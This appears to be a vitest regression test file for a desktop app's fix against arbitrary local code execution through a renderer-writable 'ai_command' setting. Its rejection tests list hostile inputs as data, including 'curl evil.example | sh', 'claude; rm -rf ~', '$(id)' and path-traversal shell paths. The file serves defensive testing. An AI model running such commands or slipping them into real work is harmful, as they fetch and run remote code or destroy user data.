// ── ⚠ THE RENDERER MUST NOT BE ABLE TO NAME THE BINARY ────────────────────────────────────────
//
// Arbitrary local code execution in two IPC calls:
//
//     setSetting("ai_command", "/tmp/payload.sh"); cliSend({ … })   →   spawn("/tmp/payload.sh")
//
// These tests pin all three layers of the fix, because each one alone is bypassable:
//
//   1. the write path is gone      — `ai_command` off the allowlist, boot invariant to keep it off
//   2. the READ path is validated  — a poisoned row from before the fix still cannot be spawned
//   3. `buildCliArgs` fails closed — the `default:` arm that spawned unmatched values now throws
//
// Layer 2 is not belt-and-braces. `settings` is plaintext SQLite: anything already running as this
// user can write the row, and closing the IPC channel does nothing about that.

import { describe, it, expect, afterEach } from "vitest";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import {
  ALLOWED_AI_COMMANDS,
  COMMAND_FOR_ASSISTANT,
  DEFAULT_AI_COMMAND,
  EXECUTABLE_SOURCE_SETTINGS,
  commandForAssistant,
  resolveAssistantCommand,
  setAssistantCommandOverrides,
  canonicalCommand,
  spawnCommandFor,
} from "./assistant-command";
import { buildCliArgs } from "./handlers/cli-assistant";
import { RENDERER_READABLE_SETTINGS, RENDERER_WRITABLE_SETTINGS } from "./setting-access";

const local = (rel: string) => fileURLToPath(new URL(rel, import.meta.url));

describe("the map is the whole set of executables this app can launch", () => {
  it("covers the three shipped assistants and nothing else", () => {
    expect(Object.keys(COMMAND_FOR_ASSISTANT).sort()).toEqual(["claude", "codex", "kiro"]);
    expect([...ALLOWED_AI_COMMANDS].sort()).toEqual(["claude", "codex", "kiro-cli"]);
  });

  it("cannot be widened at runtime", () => {
    // Frozen so a later import cannot add an entry — the set of spawnable binaries is a build-time
    // fact, and a mutable module object would let any code in main quietly extend it.
    expect(Object.isFrozen(COMMAND_FOR_ASSISTANT)).toBe(true);
    expect(() => {
      (COMMAND_FOR_ASSISTANT as Record<string, string>).evil = "/tmp/payload.sh";
    }).toThrow();
    expect(ALLOWED_AI_COMMANDS.has("/tmp/payload.sh")).toBe(false);
  });

  it("derives the allowlist from the map, so the two cannot drift", () => {
    for (const command of Object.values(COMMAND_FOR_ASSISTANT)) {
      expect(ALLOWED_AI_COMMANDS.has(command)).toBe(true);
    }
    expect(ALLOWED_AI_COMMANDS.size).toBe(new Set(Object.values(COMMAND_FOR_ASSISTANT)).size);
  });
});

describe("commandForAssistant refuses anything it does not ship", () => {
  it("maps the ids it knows", () => {
    expect(commandForAssistant("claude")).toBe("claude");
    expect(commandForAssistant("codex")).toBe("codex");
    // The id is "kiro"; the binary is "kiro-cli". The renderer never has to know that.
    expect(commandForAssistant("kiro")).toBe("kiro-cli");
  });

  it("returns null for an unknown id rather than defaulting", () => {
    // A refusal the user sees beats silently starting an assistant they did not pick.
    expect(commandForAssistant("bash")).toBeNull();
    expect(commandForAssistant("")).toBeNull();
  });

  it("is not fooled by a payload that is not a string", () => {
    // IPC payloads are attacker-shaped: `undefined`, an object, an array all arrive intact.
    for (const junk of [undefined, null, 42, {}, [], { toString: () => "claude" }]) {
      expect(commandForAssistant(junk)).toBeNull();
    }
  });

  it("does not answer for inherited Object properties", () => {
    /**
     * ⚠ THE REASON `hasOwnProperty` IS USED INSTEAD OF `map[id] ?? null`. With a plain lookup,
     * `commandForAssistant("constructor")` returns `Object`'s constructor — a function, which is
     * truthy — and the handler would sail past its `if (!command)` guard and hand a non-string to
     * `writeSetting`.
     */
    for (const inherited of ["constructor", "__proto__", "toString", "hasOwnProperty"]) {
      expect(commandForAssistant(inherited)).toBeNull();
    }
  });
});

describe("resolveAssistantCommand — the last word before spawn", () => {
  it("passes the three legal commands through unchanged", () => {
    expect(resolveAssistantCommand("claude")).toBe("claude");
    expect(resolveAssistantCommand("kiro-cli")).toBe("kiro-cli");
    expect(resolveAssistantCommand("codex")).toBe("codex");
  });

  it("normalises the legacy `kiro` spelling instead of rejecting it", () => {
    /**
     * ⚠ EXISTING INSTALLS DEPEND ON THIS. `ai_command = "kiro"` predates the rename and
     * `cli:useAcpMode` still tested for it, so treating it as unrecognised would have moved every
     * existing Kiro user silently onto Claude — a functional regression dressed up as a security fix.
     */
    expect(resolveAssistantCommand("kiro")).toBe("kiro-cli");
  });

  it("refuses a poisoned row and falls back to the default", () => {
    // The exact payload from the finding. A row written before this fix must not execute.
    for (const poisoned of [
      "/tmp/payload.sh",
      "curl evil.example | sh",
      "rm",
      "osascript",
      "../../../../bin/sh",
      "claude; rm -rf ~",
      " claude",
      "claude ",
      "CLAUDE",
    ]) {
      expect(resolveAssistantCommand(poisoned)).toBe(DEFAULT_AI_COMMAND);
    }
  });

  it("treats a full path to a LEGAL binary as unrecognised too", () => {
    /**
     * Deliberate, and worth stating: `/usr/local/bin/claude` is refused. Accepting it would need
     * either a substring test — which "…/evil-claude" passes — or path resolution, and neither is
     * worth it when nothing in the app has ever written a path here.
     */
    expect(resolveAssistantCommand("/usr/local/bin/claude")).toBe(DEFAULT_AI_COMMAND);
  });

  it("falls back for an absent, empty or non-string value", () => {
    // A fresh install has no row at all; the old code read this as `|| "claude"`.
    for (const missing of [null, undefined, "", 0, {}, ["claude"]]) {
      expect(resolveAssistantCommand(missing)).toBe(DEFAULT_AI_COMMAND);
    }
  });

  it("never returns anything outside the allowlist", () => {
    // The property that matters, stated as a property rather than as examples.
    const inputs = ["claude", "kiro", "kiro-cli", "codex", "cli", "", null, "/tmp/x", "sh", 7];
    for (const input of inputs) {
      expect(ALLOWED_AI_COMMANDS.has(resolveAssistantCommand(input))).toBe(true);
    }
  });
});

describe("buildCliArgs fails closed", () => {
  it("still builds the three real assistants", () => {
    expect(buildCliArgs("claude", false).cmd).toBe("claude");
    expect(buildCliArgs("kiro-cli", false).cmd).toBe("kiro-cli");
    expect(buildCliArgs("codex", false).cmd).toBe("codex");
  });

  it("throws instead of spawning an unmatched command", () => {
    /**
     * ⚠ THIS ARM IS WHAT MADE THE SETTING DANGEROUS. It read
     * `default: return { cmd: command, args: [] }`, so any value that did not match the switch was
     * spawned verbatim — no allowlist, no validation. Reverting this to the old line makes this test
     * fail, which is the point of having it.
     */
    expect(() => buildCliArgs("/tmp/payload.sh", false)).toThrow(/refusing to spawn/i);
    expect(() => buildCliArgs("sh", false)).toThrow(/refusing to spawn/i);
  });

  it("never returns a cmd outside the allowlist", () => {
    for (const command of ALLOWED_AI_COMMANDS) {
      for (const continued of [false, true]) {
        const { cmd } = buildCliArgs(command, continued, undefined, continued ? "t-1" : null);
        expect(ALLOWED_AI_COMMANDS.has(cmd)).toBe(true);
      }
    }
  });
});

describe("the setting policy itself", () => {
  it("keeps ai_command readable and unwritable", () => {
    // Readable: the chat header and the assistant theme both branch on it.
    expect(RENDERER_READABLE_SETTINGS.has("ai_command")).toBe(true);
    expect(RENDERER_WRITABLE_SETTINGS.has("ai_command")).toBe(false);
  });

  it("takes ai_assistant off the write list with it", () => {
    /**
     * Both or neither. `cli:setAssistant` writes the pair, and leaving `ai_assistant` writable would
     * let the renderer show "Codex" while Claude is the process actually running — a lie about which
     * assistant is reading the project.
     */
    expect(RENDERER_WRITABLE_SETTINGS.has("ai_assistant")).toBe(false);
    expect(RENDERER_READABLE_SETTINGS.has("ai_assistant")).toBe(true);
  });

  it("names ai_command as an executable-source key for the boot invariant", () => {
    expect(EXECUTABLE_SOURCE_SETTINGS.has("ai_command")).toBe(true);
  });

  it("holds no executable-source key on the write list", () => {
    // The same assertion the module-load invariant makes, so a failure here explains itself.
    for (const key of EXECUTABLE_SOURCE_SETTINGS) {
      expect(RENDERER_WRITABLE_SETTINGS.has(key)).toBe(false);
    }
  });
});

describe("no renderer code writes the command any more", () => {
  /**
   * The regression guard that actually matters. Removing the key from the allowlist turns those two
   * old `setSetting("ai_command", …)` calls into SILENT NO-OPS — a logged denial in main and nothing
   * on screen — so the security fix would have quietly broken assistant selection. This sweep is
   * cheap and it fails loudly if either call comes back.
   */
  const FILES = [
    "./../renderer/components/SelectAssistantView.tsx",
    "./../renderer/components/SettingsView.tsx",
  ];

  it("no setSetting(\"ai_command\") or (\"ai_assistant\") survives in the renderer", () => {
    for (const rel of FILES) {
      const src = readFileSync(local(rel), "utf8");
      expect(src, `${rel} must not write ai_command`).not.toMatch(
        /setSetting\(\s*["']ai_command["']/
      );
      expect(src, `${rel} must not write ai_assistant`).not.toMatch(
        /setSetting\(\s*["']ai_assistant["']/
      );
    }
  });

  it("both views go through cliSetAssistant instead", () => {
    for (const rel of FILES) {
      expect(readFileSync(local(rel), "utf8")).toContain("cliSetAssistant(");
    }
  });

  it("the bridge exposes it and passes only the id", () => {
    const preload = readFileSync(local("./../preload/index.ts"), "utf8");
    expect(preload).toMatch(
      /cliSetAssistant:\s*\(assistantId: string\)\s*=>\s*ipcRenderer\.invoke\("cli:setAssistant", assistantId\)/
    );
  });

  it("the handler maps the id in MAIN and refuses an unknown one", () => {
    const handler = readFileSync(local("./handlers/cli-assistant.ts"), "utf8");
    const block = handler.slice(handler.indexOf('ipcMain.handle("cli:setAssistant"'));
    expect(block).toContain("commandForAssistant(assistantId)");
    expect(block).toMatch(/if \(!command\)[\s\S]{0,160}return \{ error/);
    // And it writes the command it derived — never a value from the payload.
    expect(block).toMatch(/writeSetting\("ai_command", command\)/);
  });

  it("every ai_command read in the spawn path is validated", () => {
    /**
     * `getSetting("ai_command") || "claude"` appeared four times; three of them fed `spawn` directly
     * or through `buildCliArgs`. Pinning the accessor rather than the call sites means a new read
     * added later has to opt OUT of validation to be unsafe, instead of opting in.
     */
    const handler = readFileSync(local("./handlers/cli-assistant.ts"), "utf8");
    // Comments stripped first: the accessor's own docstring quotes the old expression verbatim to
    // explain what it replaced, and counting prose as a call site is how a guard like this starts
    // reporting noise.
    const code = handler.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
    const reads = code.match(/getSetting\("ai_command"\)/g) ?? [];
    expect(reads.length, "only the accessor may read it raw").toBe(1);
    expect(code).toMatch(/function assistantCommand\(\)[\s\S]{0,120}resolveAssistantCommand\(/);
    expect(code).not.toMatch(/getSetting\("ai_command"\) \|\| "claude"/);
  });
});

// ── ⚠ LOCAL RENAME OVERRIDES ───────────────────────────────────────────────────────────────────
//
// For installs whose binary is not called the shipped name — `claude_bedrock` for a Bedrock-backed
// build, `claude-wrapper` on a wrapper-based install. Without it, `spawn claude ENOENT` on the
// participant's first message and nothing they can do about it.
//
// These assertions are about the SHAPE OF WHAT MAY BE INJECTED, not about convenience: this is the
// module that decides what the app executes, and the override relaxes it.
describe("⚠ local rename overrides", () => {
  afterEach(() => setAssistantCommandOverrides({}));

  /**
   * ⚠ THE CONTRACT THESE ASSERTIONS PIN WAS WRONG IN THE FIRST VERSION, AND IT BROKE BOTH CODEX AND
   * CLAUDE IN THE APP. `commandForAssistant` / `resolveAssistantCommand` used to RETURN the rename.
   * But their return value is used as an IDENTITY TOKEN throughout: `currentCli === "claude"` picks
   * the SDK path in AssistantChatView, `command === "codex"` gates the JSON parsing in the spawn
   * handler, `assistantCommand() === "kiro-cli"` selects ACP mode. Returning `claude_bedrock` made
   * every one of those comparisons false — Claude's stream-json was dumped raw into the chat and
   * Codex's JSONL likewise.
   *
   * So: IDENTITY STAYS CANONICAL, and the rename is applied only where a binary is actually
   * spawned. That is `spawnCommandFor`, used by buildCliArgs, claude-code.ts's SDK resolver and
   * kiro-acp.ts's resolver — the three spawn sites.
   */
  it("identity functions return the SHIPPED name even when a rename is configured", () => {
    setAssistantCommandOverrides({ claude: "claude_bedrock", codex: "codex_bedrock" });
    expect(commandForAssistant("claude")).toBe("claude");
    expect(commandForAssistant("codex")).toBe("codex");
    expect(resolveAssistantCommand("claude")).toBe("claude");
    expect(resolveAssistantCommand("")).toBe("claude");
    expect(resolveAssistantCommand("cli")).toBe("claude");
  });

  it("spawnCommandFor is the ONLY place the rename appears", () => {
    setAssistantCommandOverrides({ claude: "claude_bedrock", codex: "codex_bedrock" });
    expect(spawnCommandFor("claude")).toBe("claude_bedrock");
    expect(spawnCommandFor("codex")).toBe("codex_bedrock");
    expect(spawnCommandFor("kiro-cli")).toBe("kiro-cli");
  });

  /**
   * ⚠ THE ASSERTION THAT MATTERS. A bare name can only select a different binary on a PATH the user
   * already controls; a path could point the spawn at an arbitrary file. Refusing separators keeps
   * this override from being the `setSetting("ai_command", "/tmp/payload")` hole the rest of this
   * module exists to close.
   */
  it("REFUSES anything containing a path separator", () => {
    for (const bad of ["/tmp/payload", "./payload", "../claude", "bin/claude", "C:\\evil.exe"]) {
      setAssistantCommandOverrides({ claude: bad });
      expect(spawnCommandFor("claude"), `${bad} must not be accepted`).toBe("claude");
    }
  });

  it("REFUSES shell metacharacters, spaces and an empty value", () => {
    for (const bad of ["claude; rm -rf /", "claude foo", "claude|tee", "$(id)", "`id`", "", "  "]) {
      setAssistantCommandOverrides({ claude: bad });
      expect(spawnCommandFor("claude"), `${bad} must not be accepted`).toBe("claude");
    }
  });

  it("REFUSES a non-string value, so a JSON object or array cannot slip through", () => {
    for (const bad of [123, null, true, {}, ["claude_bedrock"]] as unknown[]) {
      setAssistantCommandOverrides({ claude: bad });
      expect(spawnCommandFor("claude")).toBe("claude");
    }
  });

  it("ignores an override for an assistant this app does not ship", () => {
    setAssistantCommandOverrides({ notAnAssistant: "anything", __proto__: "polluted" });
    expect(commandForAssistant("notAnAssistant")).toBeNull();
    expect(spawnCommandFor("claude")).toBe("claude");
  });

  it("tolerates a malformed top-level value rather than throwing at boot", () => {
    for (const bad of [null, undefined, "string", 42, ["claude"]] as unknown[]) {
      expect(() => setAssistantCommandOverrides(bad)).not.toThrow();
      expect(spawnCommandFor("claude")).toBe("claude");
    }
  });
});

// ── ⚠ A RENAME MUST NOT CHANGE WHICH ARGV IS BUILT ─────────────────────────────────────────────
//
// REGRESSION. The first version of the rename override broke Codex outright: `buildCliArgs`
// switches on the command string to choose argv, so `codex_bedrock` matched no case and hit the
// fail-closed default — "Unsupported assistant command — refusing to spawn". The override had
// changed WHAT RUNS without telling the code that decides HOW it is run.
//
// It was broken twice over, which is why both halves are asserted here: even once the switch
// matched, the cases returned a HARDCODED `{ cmd: "codex" }`, so the renamed binary would have been
// silently discarded and the shipped name spawned instead.
describe("⚠ rename overrides and argv construction", () => {
  afterEach(() => setAssistantCommandOverrides({}));

  it("canonicalCommand maps a renamed binary back to the shipped identity", () => {
    setAssistantCommandOverrides({ claude: "claude_bedrock", codex: "codex_bedrock" });
    expect(canonicalCommand("codex_bedrock")).toBe("codex");
    expect(canonicalCommand("claude_bedrock")).toBe("claude");
    // Shipped names and the legacy "kiro" spelling are unaffected.
    expect(canonicalCommand("codex")).toBe("codex");
    expect(canonicalCommand("kiro")).toBe("kiro-cli");
  });

  it("canonicalCommand leaves an UNKNOWN command unchanged, so fail-closed still fires", () => {
    setAssistantCommandOverrides({ codex: "codex_bedrock" });
    // Defaulting here would turn a poisoned ai_command into a silent run of Claude.
    expect(canonicalCommand("definitely-not-an-assistant")).toBe("definitely-not-an-assistant");
  });

  it("spawnCommandFor returns the renamed binary, not the shipped name", () => {
    setAssistantCommandOverrides({ codex: "codex_bedrock" });
    expect(spawnCommandFor("codex")).toBe("codex_bedrock");
    expect(spawnCommandFor("claude")).toBe("claude");
  });

  /** The actual break: argv for a renamed binary must be built, not refused. */
  it("buildCliArgs BUILDS argv for a renamed binary instead of refusing it", () => {
    setAssistantCommandOverrides({ codex: "codex_bedrock" });
    expect(() => buildCliArgs("codex_bedrock", false)).not.toThrow();
    const { cmd, args } = buildCliArgs("codex_bedrock", false);
    // Spawns the rename...
    expect(cmd).toBe("codex_bedrock");
    // ...with the SAME argv the shipped name would have produced.
    expect(args).toEqual(buildCliArgs("codex", false).args);
  });

  it("buildCliArgs does the same for a renamed claude and kiro", () => {
    setAssistantCommandOverrides({ claude: "claude_bedrock", kiro: "kiro_custom" });
    expect(buildCliArgs("claude_bedrock", false).cmd).toBe("claude_bedrock");
    expect(buildCliArgs("claude_bedrock", false).args).toEqual(buildCliArgs("claude", false).args);
    expect(buildCliArgs("kiro_custom", false).cmd).toBe("kiro_custom");
    expect(buildCliArgs("kiro_custom", false).args).toEqual(buildCliArgs("kiro-cli", false).args);
  });

  /** The fail-closed default must survive all of this — it is the last gate before spawn. */
  it("STILL refuses a command that is neither shipped nor a configured rename", () => {
    setAssistantCommandOverrides({ codex: "codex_bedrock" });
    expect(() => buildCliArgs("codex_evil", false)).toThrow(/Unsupported assistant command/);
    expect(() => buildCliArgs("/tmp/payload", false)).toThrow(/Unsupported assistant command/);
  });
});

// ── ⚠ THE COMPARISONS A RENAME MUST NOT BREAK ──────────────────────────────────────────────────
//
// One cause both times — the rename leaked into values the app compares as IDENTITY:
//
//   AssistantChatView.tsx:494   const usesSdk = currentCli === "claude"      → picks the SDK path
//   cli-assistant.ts:568,751    if (command === "codex")                    → gates JSON parsing
//   cli-assistant.ts:177        assistantCommand() === "kiro-cli"           → selects ACP mode
//
// With `claude_bedrock` / `codex_bedrock` every one of those went false, so each assistant fell
// through to a path whose parser did not understand its output. These assertions encode the rule that
// prevents it: whatever a rename is set to, the identity a comparison sees is the SHIPPED name.
describe("⚠ a rename must not change assistant IDENTITY", () => {
  afterEach(() => setAssistantCommandOverrides({}));

  it("every shipped assistant keeps its identity under a rename", () => {
    setAssistantCommandOverrides({
      claude: "claude_bedrock",
      codex: "codex_bedrock",
      kiro: "kiro_custom",
    });
    for (const [id, shipped] of Object.entries(COMMAND_FOR_ASSISTANT)) {
      expect(commandForAssistant(id), `${id} identity must stay ${shipped}`).toBe(shipped);
      expect(resolveAssistantCommand(shipped), `${shipped} must resolve to itself`).toBe(shipped);
      // ...while the binary that actually runs IS the rename.
      expect(spawnCommandFor(shipped)).not.toBe(shipped);
    }
  });

  it("canonicalCommand maps a rename back, for any code that only has the binary name", () => {
    setAssistantCommandOverrides({ claude: "claude_bedrock", codex: "codex_bedrock" });
    expect(canonicalCommand("claude_bedrock")).toBe("claude");
    expect(canonicalCommand("codex_bedrock")).toBe("codex");
    expect(canonicalCommand("kiro")).toBe("kiro-cli");
    // Unknown stays unknown, so a caller's fail-closed branch still fires.
    expect(canonicalCommand("nope")).toBe("nope");
  });
});
